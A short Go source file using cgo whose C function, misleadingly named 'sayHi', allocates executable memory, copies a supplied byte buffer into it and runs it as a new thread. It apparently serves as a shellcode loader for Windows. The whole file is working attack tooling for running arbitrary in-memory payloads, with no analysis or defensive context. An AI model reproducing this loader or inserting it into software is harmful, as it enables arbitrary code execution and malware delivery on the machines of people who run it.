package common

/*
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
void sayHi(int* p,int len) {
	char * payload = VirtualAlloc(0, 1024*1024, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	memcpy(payload, p, len);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);
}
*/
import "C"
import "unsafe"

func CreateThread(p []byte) {
	C.sayHi((*C.int)((unsafe.Pointer)(&p[0])), (C.int)(len(p)))
}